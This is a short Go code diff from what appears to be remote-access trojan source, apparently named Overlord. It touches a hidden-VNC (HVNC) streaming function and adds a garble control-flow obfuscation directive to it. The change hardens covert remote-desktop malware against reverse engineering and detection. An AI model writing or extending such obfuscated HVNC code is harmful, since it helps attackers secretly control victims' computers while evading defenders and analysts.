@@ -27,6 +27,7 @@ func GetPersistedHVNCDisplay() int {
 }
 
 func HVNCStart(ctx context.Context, env *rt.Env, autoStartExplorer bool) error {
+	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 	interval, fps := streamInterval("OVERLORD_HVNC_MAX_FPS", 120)
 	capture.SetH264TargetFPS(fps)
 	log.Printf("hvnc: starting stream (max fps %d)", fps)
